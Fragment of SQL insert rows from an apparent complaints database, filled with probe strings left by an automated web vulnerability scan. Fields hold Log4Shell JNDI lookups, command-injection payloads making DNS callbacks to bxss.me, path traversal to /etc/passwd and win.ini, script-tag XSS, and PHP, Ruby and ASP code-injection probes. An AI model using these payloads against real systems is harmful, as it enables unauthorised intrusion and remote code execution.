(66, '\'+\'A\'.concat(70-3).concat(22*4).concat(121).concat(86).concat(106).concat(70)+(require\'socket\'\nSocket.gethostbyname(\'hitgy\'+\'uafeanzn9ab14.bxss.me.\')[3].to_s)+\'', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:14', '2022-08-11 10:38:14', 'sample@email.tst'),
(67, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '../../../../../../../../../../../../../../windows/win.ini', '', '', '0000-00-00', 0, '2022-08-11 10:38:14', '2022-08-11 10:38:14', 'sample@email.tst'),
(68, '${${:::::::::::::::::-j}ndi:dns${:::::::::::::::::-:}//dns.log4j..-3547..1b7ec${::-.}1${::-.}bxss.me}}', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:14', '2022-08-11 10:38:14', 'sample@email.tst'),
(69, 'ncMUFCMU\'\"()&%<acx><ScRiPt >bc6k(9529)</ScRiPt>', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:14', '2022-08-11 10:38:14', 'sample@email.tst'),
(70, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', 'complaints', '', '', '0000-00-00', 0, '2022-08-11 10:38:15', '2022-08-11 10:38:15', 'sample@email.tst'),
(71, 'ncMUFCMU', '', '', '', '', '<!--', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:15', '2022-08-11 10:38:15', 'sample@email.tst'),
(72, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '\'+response.write(9733618*9004926)+\'', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:15', '2022-08-11 10:38:15', 'sample@email.tst'),
(73, 'bxss.me/t/xss.html?%00', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:15', '2022-08-11 10:38:15', 'sample@email.tst'),
(74, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', 'http://bxss.me/t/fit.txt?.jpg', '', '', '0000-00-00', 0, '2022-08-11 10:38:15', '2022-08-11 10:38:15', 'sample@email.tst'),
(75, 'ncMUFCMU', '', '', '', '', '1LCpX6clO', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:15', '2022-08-11 10:38:15', 'sample@email.tst'),
(76, '|echo dbeocj$()\\ quordd\\nz^xyu||a #\' |echo dbeocj$()\\ quordd\\nz^xyu||a #|\" |echo dbeocj$()\\ quordd\\nz^xyu||a #', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:15', '2022-08-11 10:38:15', 'sample@email.tst'),
(77, 'ncMUFCMU', '', '', '', '', '1', NULL, '!(()&&!|*|*|', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:15', '2022-08-11 10:38:15', 'sample@email.tst'),
(78, '\";print(md5(31337));$a=\"', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:15', '2022-08-11 10:38:15', 'sample@email.tst'),
(79, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '\".gethostbyname(lc(\"hittc\".\"zbhcldlh725f1.bxss.me.\")).\"A\".chr(67).chr(hex(\"58\")).chr(114).chr(74).chr(116).chr(72).\"', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:15', '2022-08-11 10:38:15', 'sample@email.tst'),
(80, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:16', '2022-08-11 10:38:16', 'sample@email.tst'),
(81, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '\"+\"A\".concat(70-3).concat(22*4).concat(116).concat(69).concat(113).concat(89)+(require\"socket\"\nSocket.gethostbyname(\"hithq\"+\"kwusrmah578e9.bxss.me.\")[3].to_s)+\"', '', '', '0000-00-00', 0, '2022-08-11 10:38:16', '2022-08-11 10:38:16', 'sample@email.tst'),
(82, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '${j${::-n}di:dns${::-:}//hitntlhxpiaiz51e3a${::-.}bxss.me}zzzz', '', '', '0000-00-00', 0, '2022-08-11 10:38:16', '2022-08-11 10:38:16', 'sample@email.tst'),
(83, 'ncMUFCMU', '', '', '', '', '1', NULL, '\'\"', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:16', '2022-08-11 10:38:16', 'sample@email.tst'),
(84, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '\"+response.write(9733618*9004926)+\"', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:16', '2022-08-11 10:38:16', 'sample@email.tst'),
(85, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', 'complaints', '', '', '0000-00-00', 0, '2022-08-11 10:38:16', '2022-08-11 10:38:16', 'sample@email.tst'),
(86, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', 'HttP://bxss.me/t/xss.html?%00', '', '', '0000-00-00', 0, '2022-08-11 10:38:17', '2022-08-11 10:38:17', 'sample@email.tst'),
(87, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', 'bxss.me', '', '', '0000-00-00', 0, '2022-08-11 10:38:17', '2022-08-11 10:38:17', 'sample@email.tst'),
(88, 'ncMUFCMU', '', '', '', '', '1', NULL, '1TTi46z4O', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:17', '2022-08-11 10:38:17', 'sample@email.tst'),
(89, 'ncMUFCMU', '', '', '', '', '1', NULL, '^(#$!@#$)(()))******', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:17', '2022-08-11 10:38:17', 'sample@email.tst'),
(90, '(nslookup hityuevgabkpk7b71e.bxss.me||perl -e \"gethostbyname(\'hityuevgabkpk7b71e.bxss.me\')\")', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:17', '2022-08-11 10:38:17', 'sample@email.tst'),
(91, '${@print(md5(31337))}', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:17', '2022-08-11 10:38:17', 'sample@email.tst'),
(92, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '../555', '', '', '0000-00-00', 0, '2022-08-11 10:38:17', '2022-08-11 10:38:17', 'sample@email.tst'),
(93, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '\'+\'A\'.concat(70-3).concat(22*4).concat(105).concat(79).concat(115).concat(65)+(require\'socket\'\nSocket.gethostbyname(\'hitvd\'+\'wrgnuqvp69c2a.bxss.me.\')[3].to_s)+\'', '', '', '0000-00-00', 0, '2022-08-11 10:38:17', '2022-08-11 10:38:17', 'sample@email.tst'),
(94, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '', '', '', '0000-00-00', 0, '2022-08-11 10:38:18', '2022-08-11 10:38:18', 'sample@email.tst'),
(95, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', 'bxss.me/t/xss.html?%00', '', '', '0000-00-00', 0, '2022-08-11 10:38:18', '2022-08-11 10:38:18', 'sample@email.tst'),
(96, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', 'complaints/.', '', '', '0000-00-00', 0, '2022-08-11 10:38:18', '2022-08-11 10:38:18', 'sample@email.tst'),
(97, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1bMnkAK6O', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:18', '2022-08-11 10:38:18', 'sample@email.tst'),
(98, 'ncMUFCMU', '', '', '', '', 'http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.jpg', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:18', '2022-08-11 10:38:18', 'sample@email.tst'),
(99, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, ')', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:18', '2022-08-11 10:38:18', 'sample@email.tst'),
(100, '$(nslookup hitayobrqrjhj26e26.bxss.me||perl -e \"gethostbyname(\'hitayobrqrjhj26e26.bxss.me\')\")', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:19', '2022-08-11 10:38:19', 'sample@email.tst'),
(101, '${@print(md5(31337))}\\', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:19', '2022-08-11 10:38:19', 'sample@email.tst'),
(102, 'ncMUFCMU', '', '', '', '', '\"+\"A\".concat(70-3).concat(22*4).concat(106).concat(83).concat(119).concat(83)+(require\"socket\"\nSocket.gethostbyname(\"hityj\"+\"tiivungxcb6bb.bxss.me.\")[3].to_s)+\"', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:19', '2022-08-11 10:38:19', 'sample@email.tst'),
(103, 'ncMUFCMU', '', '', '', '', 'HttP://bxss.me/t/xss.html?%00', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:19', '2022-08-11 10:38:19', 'sample@email.tst'),
(104, 'ncMUFCMU', '', '', '', '', 'complaints', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:19', '2022-08-11 10:38:19', 'sample@email.tst'),
(105, 'ncMUFCMU', '', '', '', '', '1some_inexistent_file_with_long_name\0.jpg', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:19', '2022-08-11 10:38:19', 'sample@email.tst'),
(106, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '!(()&&!|*|*|', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:20', '2022-08-11 10:38:20', 'sample@email.tst'),
(107, '\'.print(md5(31337)).\'', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:20', '2022-08-11 10:38:20', 'sample@email.tst'),
(108, 'ncMUFCMU', '', '', '', '', '\'+\'A\'.concat(70-3).concat(22*4).concat(99).concat(81).concat(104).concat(67)+(require\'socket\'\nSocket.gethostbyname(\'hitsd\'+\'dpuqeuxr6143b.bxss.me.\')[3].to_s)+\'', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:20', '2022-08-11 10:38:20', 'sample@email.tst'),
(109, '|(nslookup hitmmfrehfrbge9c7c.bxss.me||perl -e \"gethostbyname(\'hitmmfrehfrbge9c7c.bxss.me\')\")', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:20', '2022-08-11 10:38:20', 'sample@email.tst'),
(110, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '${${:::::::::::::::::-j}ndi:dns${:::::::::::::::::-:}//dns.log4j..-3736..1b7ec${::-.}1${::-.}bxss.me}}', '', '', '0000-00-00', 0, '2022-08-11 10:38:20', '2022-08-11 10:38:20', 'sample@email.tst'),
(111, 'ncMUFCMU', '', '', '', '', 'bxss.me/t/xss.html?%00', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:20', '2022-08-11 10:38:20', 'sample@email.tst'),
(112, 'ncMUFCMU', '', '', '', '', 'complaints', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:21', '2022-08-11 10:38:21', 'sample@email.tst'),
(113, 'ncMUFCMU', '', '', '', '', 'Http://bxss.me/t/fit.txt', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:21', '2022-08-11 10:38:21', 'sample@email.tst'),
(114, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '^(#$!@#$)(()))******', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:21', '2022-08-11 10:38:21', 'sample@email.tst'),
(115, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', ';assert(base64_decode(\'cHJpbnQobWQ1KDMxMzM3KSk7\'));', '', '', '0000-00-00', 0, '2022-08-11 10:38:21', '2022-08-11 10:38:21', 'sample@email.tst'),
(116, '`(nslookup hitbqurkqtqah6cd4a.bxss.me||perl -e \"gethostbyname(\'hitbqurkqtqah6cd4a.bxss.me\')\")`', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:21', '2022-08-11 10:38:21', 'sample@email.tst'),
(117, 'ncMUFCMU', '', '', '', '', '${j${::-n}di:dns${::-:}//hitjqvrarxlmpe571a${::-.}bxss.me}zzzz', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:21', '2022-08-11 10:38:21', 'sample@email.tst'),
(118, 'ncMUFCMU', '', '', '', '', '1', NULL, 'bxss.me/t/xss.html?%00', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:22', '2022-08-11 10:38:22', 'sample@email.tst'),
(119, '\'\"()&%<acx><ScRiPt >bc6k(9625)</ScRiPt>', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:22', '2022-08-11 10:38:22', 'sample@email.tst'),
(120, 'ncMUFCMU', '', '', '', '', 'http://bxss.me/t/fit.txt?.jpg', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:22', '2022-08-11 10:38:22', 'sample@email.tst'),
(121, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '\"+\"A\".concat(70-3).concat(22*4).concat(111).concat(75).concat(111).concat(69)+(require\"socket\"\nSocket.gethostbyname(\"hitdr\"+\"tqzpgshu06293.bxss.me.\")[3].to_s)+\"', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:22', '2022-08-11 10:38:22', 'sample@email.tst'),
(122, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, 'HttP://bxss.me/t/xss.html?%00', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:23', '2022-08-11 10:38:23', 'sample@email.tst'),
(123, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', 'echo kopxlw$()\\ yzxjzo\\nz^xyu||a #\' &echo kopxlw$()\\ yzxjzo\\nz^xyu||a #|\" &echo kopxlw$()\\ yzxjzo\\nz^xyu||a #', '', '', '0000-00-00', 0, '2022-08-11 10:38:23', '2022-08-11 10:38:23', 'sample@email.tst'),
(124, 'ncMUFCMU', '', '', '', '', '1', NULL, '<!--', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:23', '2022-08-11 10:38:23', 'sample@email.tst'),
(125, 'ncMUFCMU', '', '', '', '', 'bxss.me', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:23', '2022-08-11 10:38:23', 'sample@email.tst'),
(126, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '\'+\'A\'.concat(70-3).concat(22*4).concat(109).concat(90).concat(119).concat(81)+(require\'socket\'\nSocket.gethostbyname(\'hitjo\'+\'uylmhvfeb7d91.bxss.me.\')[3].to_s)+\'', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:23', '2022-08-11 10:38:23', 'sample@email.tst'),
(127, 'ncMUFCMU9281354', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:23', '2022-08-11 10:38:23', 'sample@email.tst'),
(128, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '12345\'\"\\\'\\\");|]*\0{\r\n<\0>', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:24', '2022-08-11 10:38:24', 'sample@email.tst'),
(129, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, 'bxss.me/t/xss.html?%00', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:24', '2022-08-11 10:38:24', 'sample@email.tst'),
(130, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '\'\"', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:24', '2022-08-11 10:38:24', 'sample@email.tst'),
(131, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '&echo fnwusv$()\\ mbuagk\\nz^xyu||a #\' &echo fnwusv$()\\ mbuagk\\nz^xyu||a #|\" &echo fnwusv$()\\ mbuagk\\nz^xyu||a #', '', '', '0000-00-00', 0, '2022-08-11 10:38:24', '2022-08-11 10:38:24', 'sample@email.tst'),
(132, 'ncMUFCMU', '', '', '', '', '1', NULL, 'Http://bxss.me/t/fit.txt', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:24', '2022-08-11 10:38:24', 'sample@email.tst'),
(133, 'ncMUFCMU', '', '', '', '', '../../../../../../../../../../../../../../etc/passwd', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:24', '2022-08-11 10:38:24', 'sample@email.tst'),
(134, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555\'\"()&%<acx><ScRiPt >bc6k(9355)</ScRiPt>', '', '', '0000-00-00', 0, '2022-08-11 10:38:24', '2022-08-11 10:38:24', 'sample@email.tst'),
(135, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '<!--', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:25', '2022-08-11 10:38:25', 'sample@email.tst'),
(136, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '|echo tiltbj$()\\ mgnjno\\nz^xyu||a #\' |echo tiltbj$()\\ mgnjno\\nz^xyu||a #|\" |echo tiltbj$()\\ mgnjno\\nz^xyu||a #', '', '', '0000-00-00', 0, '2022-08-11 10:38:25', '2022-08-11 10:38:25', 'sample@email.tst'),
(137, 'ncMUFCMU', '', '', '', '', '../../../../../../../../../../../../../../windows/win.ini', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:25', '2022-08-11 10:38:25', 'sample@email.tst'),
(138, 'ncMUFCMU', '', '', '', '', '1', NULL, 'bxss.me', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:25', '2022-08-11 10:38:25', 'sample@email.tst'),
(139, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '\'\"()&%<acx><ScRiPt >bc6k(9735)</ScRiPt>', '', '', '0000-00-00', 0, '2022-08-11 10:38:25', '2022-08-11 10:38:25', 'sample@email.tst'),
(140, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '(nslookup hitbxzimzmyrv59283.bxss.me||perl -e \"gethostbyname(\'hitbxzimzmyrv59283.bxss.me\')\")', '', '', '0000-00-00', 0, '2022-08-11 10:38:26', '2022-08-11 10:38:26', 'sample@email.tst'),
(141, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:26', '2022-08-11 10:38:26', 'sample@email.tst'),
(142, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, 'http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.jpg', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:26', '2022-08-11 10:38:26', 'sample@email.tst'),
(143, 'ncMUFCMU', '', '', '', '', 'complaints/.', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:27', '2022-08-11 10:38:27', 'sample@email.tst'),
(144, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '5559547953', '', '', '0000-00-00', 0, '2022-08-11 10:38:27', '2022-08-11 10:38:27', 'sample@email.tst'),
(145, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:27', '2022-08-11 10:38:27', 'sample@email.tst'),
(146, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '\';print(md5(31337));$a=\'', '', '', '0000-00-00', 0, '2022-08-11 10:38:27', '2022-08-11 10:38:27', 'sample@email.tst'),
(147, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1some_inexistent_file_with_long_name\0.jpg', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:27', '2022-08-11 10:38:27', 'sample@email.tst'),
(148, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '$(nslookup hittfltqzazpy69698.bxss.me||perl -e \"gethostbyname(\'hittfltqzazpy69698.bxss.me\')\")', '', '', '0000-00-00', 0, '2022-08-11 10:38:27', '2022-08-11 10:38:27', 'sample@email.tst'),
(149, 'ncMUFCMU', '', '', '', '', '../1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:27', '2022-08-11 10:38:27', 'sample@email.tst'),
(150, 'ncMUFCMU', '', '', '', '', '1', NULL, 'complaints', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:28', '2022-08-11 10:38:28', 'sample@email.tst'),
(151, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:28', '2022-08-11 10:38:28', 'sample@email.tst'),
(152, 'ncMUFCMU', '', '', '', '', '1\'\"()&%<acx><ScRiPt >bc6k(9477)</ScRiPt>', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:28', '2022-08-11 10:38:28', 'sample@email.tst'),
(153, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '&(nslookup hitwsufvsdowxea134.bxss.me||perl -e \"gethostbyname(\'hitwsufvsdowxea134.bxss.me\')\")&\'\\\"`0&(nslookup hitwsufvsdowxea134.bxss.me||perl -e \"gethostbyname(\'hitwsufvsdowxea134.bxss.me\')\")&`\'', '', '', '0000-00-00', 0, '2022-08-11 10:38:28', '2022-08-11 10:38:28', 'sample@email.tst'),
(154, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, 'Http://bxss.me/t/fit.txt', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:28', '2022-08-11 10:38:28', 'sample@email.tst'),
(155, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '\";print(md5(31337));$a=\"', '', '', '0000-00-00', 0, '2022-08-11 10:38:28', '2022-08-11 10:38:28', 'sample@email.tst'),
(156, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:28', '2022-08-11 10:38:28', 'sample@email.tst'),
(157, 'ncMUFCMU', '', '', '', '', '1', NULL, 'complaints', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:29', '2022-08-11 10:38:29', 'sample@email.tst'),
(158, 'ncMUFCMU', '', '', '', '', '\'\"()&%<acx><ScRiPt >bc6k(9822)</ScRiPt>', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:29', '2022-08-11 10:38:29', 'sample@email.tst'),
(159, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, 'http://bxss.me/t/fit.txt?.jpg', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:29', '2022-08-11 10:38:29', 'sample@email.tst'),
(160, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '|(nslookup hitmvhognoepk3d55b.bxss.me||perl -e \"gethostbyname(\'hitmvhognoepk3d55b.bxss.me\')\")', '', '', '0000-00-00', 0, '2022-08-11 10:38:29', '2022-08-11 10:38:29', 'sample@email.tst'),
(161, 'ncMUFCMU', '', '', '', '', '${${:::::::::::::::::-j}ndi:dns${:::::::::::::::::-:}//dns.log4j..-3960..1b7ec${::-.}1${::-.}bxss.me}}', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:29', '2022-08-11 10:38:29', 'sample@email.tst'),
(162, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '${@print(md5(31337))}', '', '', '0000-00-00', 0, '2022-08-11 10:38:29', '2022-08-11 10:38:29', 'sample@email.tst'),
(163, 'ncMUFCMU', '', '', '', '', '1', NULL, '../555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:29', '2022-08-11 10:38:29', 'sample@email.tst'),
(164, 'ncMUFCMU', '', '', '', '', '1', NULL, 'complaints/.', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:30', '2022-08-11 10:38:30', 'sample@email.tst'),
(165, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '${@print(md5(31337))}\\', '', '', '0000-00-00', 0, '2022-08-11 10:38:30', '2022-08-11 10:38:30', 'sample@email.tst'),
(166, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, 'bxss.me', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:30', '2022-08-11 10:38:30', 'sample@email.tst'),
(167, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '`(nslookup hitgpjpmlknrmc4e54.bxss.me||perl -e \"gethostbyname(\'hitgpjpmlknrmc4e54.bxss.me\')\")`', '', '', '0000-00-00', 0, '2022-08-11 10:38:30', '2022-08-11 10:38:30', 'sample@email.tst'),
(168, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '../../../../../../../../../../../../../../etc/passwd', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:30', '2022-08-11 10:38:30', 'sample@email.tst'),
(169, 'ncMUFCMU', '', '', '', '', '19381628', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:30', '2022-08-11 10:38:30', 'sample@email.tst'),
(170, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, 'complaints', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:31', '2022-08-11 10:38:31', 'sample@email.tst'),
(171, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:31', '2022-08-11 10:38:31', 'sample@email.tst'),
(172, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '\'.print(md5(31337)).\'', '', '', '0000-00-00', 0, '2022-08-11 10:38:31', '2022-08-11 10:38:31', 'sample@email.tst'),
